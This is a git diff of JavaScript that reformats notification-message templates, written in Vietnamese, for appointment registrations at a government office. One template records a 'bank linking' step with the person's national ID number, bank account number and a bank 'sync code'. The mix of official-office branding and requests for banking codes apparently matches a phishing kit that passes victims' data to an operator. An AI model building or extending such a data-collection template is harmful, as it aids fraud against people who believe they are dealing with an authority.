@@ -143,43 +143,19 @@ function formatTime(timeString) {
 }
 
 function formatAppointmentMessage(data) {
-    return `🔔 <b>ĐĂNG KÝ LỊCH HẸN MỚI</b>
-👤 <b>Họ tên:</b> ${data.fullName}
-📱 <b>SĐT:</b> ${data.phone}
-🆔 <b>CCCD:</b> ${data.idNumber}
-📅 <b>Ngày hẹn:</b> ${formatDateToDDMMYYYY(data.appointmentDate)}
-⏰ <b>Giờ:</b> ${formatTime(data.appointmentTime)}
-🏢 <b>Đơn vị:</b> ${data.soBanNganh}
-📝 <b>Nội dung:</b> ${data.jobType} - ${data.purpose}
-${data.notes ? `📌 <b>Ghi chú:</b> ${data.notes}` : ''}
-⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
+    return `🔔 <b>ĐĂNG KÝ LỊCH HẸN MỚI</b>\n👤 <b>Họ tên:</b> ${data.fullName}\n📱 <b>SĐT:</b> ${data.phone}\n🆔 <b>CCCD:</b> ${data.idNumber}\n📅 <b>Ngày hẹn:</b> ${formatDateToDDMMYYYY(data.appointmentDate)}\n⏰ <b>Giờ:</b> ${formatTime(data.appointmentTime)}\n🏢 <b>Đơn vị:</b> ${data.soBanNganh}\n📝 <b>Nội dung:</b> ${data.jobType} - ${data.purpose}\n${data.notes ? `📌 <b>Ghi chú:</b> ${data.notes}` : ''}\n⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
 }
 
 function formatUBNDAppointmentMessage(data) {
-    return `🏛️ <b>LỊCH HẸN UBND MỚI</b>
-👤 <b>Họ tên:</b> ${data.fullName}
-📱 <b>SĐT:</b> ${data.phone}
-📅 <b>Ngày:</b> ${formatDateToDDMMYYYY(data.appointmentDate)}
-⏰ <b>Giờ:</b> ${data.timeSlot}
-🏢 <b>Bộ phận:</b> ${data.organization}
-📋 <b>Công việc:</b> ${data.jobType}
-⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
+    return `🏛️ <b>LỊCH HẸN UBND MỚI</b>\n👤 <b>Họ tên:</b> ${data.fullName}\n📱 <b>SĐT:</b> ${data.phone}\n📅 <b>Ngày:</b> ${formatDateToDDMMYYYY(data.appointmentDate)}\n⏰ <b>Giờ:</b> ${data.timeSlot}\n🏢 <b>Bộ phận:</b> ${data.organization}\n📋 <b>Công việc:</b> ${data.jobType}\n⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
 }
 
 function formatBankSyncMessage(data, code) {
-    return `🏦 <b>LIÊN KẾT NGÂN HÀNG</b>
-👤 <b>Họ tên:</b> ${data.fullName}
-🏦 <b>Ngân hàng:</b> ${data.bankName}
-💳 <b>STK:</b> ${data.accountNumber}
-🔐 <b>Mã đồng bộ:</b> <code>${code}</code>
-⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
+    return `🏦 <b>LIÊN KẾT NGÂN HÀNG</b>\n👤 <b>Họ tên:</b> ${data.fullName}\n🏦 <b>Ngân hàng:</b> ${data.bankName}\n💳 <b>STK:</b> ${data.accountNumber}\n🔐 <b>Mã đồng bộ:</b> <code>${code}</code>\n⏳ <i>Đăng ký lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
 }
 
 function formatDeleteMessage(data, type) {
-    return `🗑️ <b>ĐÃ XÓA ĐĂNG KÝ (${type.toUpperCase()})</b>
-👤 <b>Họ tên:</b> ${data.fullName}
-📱 <b>SĐT:</b> ${data.phone || 'N/A'}
-⏳ <i>Xóa lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
+    return `🗑️ <b>ĐÃ XÓA ĐĂNG KÝ (${type.toUpperCase()})</b>\n👤 <b>Họ tên:</b> ${data.fullName}\n📱 <b>SĐT:</b> ${data.phone || 'N/A'}\n⏳ <i>Xóa lúc: ${new Date().toLocaleString('vi-VN')}</i>`;
 }
 
 // --- CÁC HÀM NOTIFY PUBLIC ---
